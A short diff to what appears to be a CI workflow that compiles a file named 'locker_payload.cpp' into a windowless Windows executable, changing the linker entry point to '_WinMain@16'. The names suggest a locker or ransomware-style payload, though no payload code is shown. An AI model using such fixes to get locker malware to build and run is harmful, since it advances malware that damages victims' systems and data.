@@ -22,7 +22,7 @@ jobs:
       shell: cmd
       run: |
         cd template
-        i686-w64-mingw32-g++ -static -O0 -mwindows -Wl,--entry=WinMain locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
+        i686-w64-mingw32-g++ -static -O0 -mwindows -Wl,--entry=_WinMain@16 locker_payload.cpp -o locker_payload.exe -luser32 -lkernel32 -ladvapi32 -lshlwapi -lntdll
         echo [DEBUG] Compilation finished, checking file...
         dir locker_payload.exe
         if exist locker_payload.exe (
